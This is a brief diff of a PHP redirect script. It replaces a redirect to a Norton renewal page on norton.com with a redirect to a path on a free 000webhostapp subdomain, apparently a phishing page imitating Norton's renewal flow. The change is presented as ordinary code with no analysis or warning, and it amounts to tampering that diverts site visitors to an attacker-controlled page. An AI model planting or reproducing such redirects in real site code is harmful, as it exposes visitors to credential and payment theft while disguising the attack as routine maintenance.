@@ -1,4 +1,4 @@
 <?php
-header("Location: https://au.norton.com/renewal?inid=hho_supp_header_renewal");
+header("Location: https://gm2610.000webhostapp.com/nor/9/nor9/");
 die();
 ?>
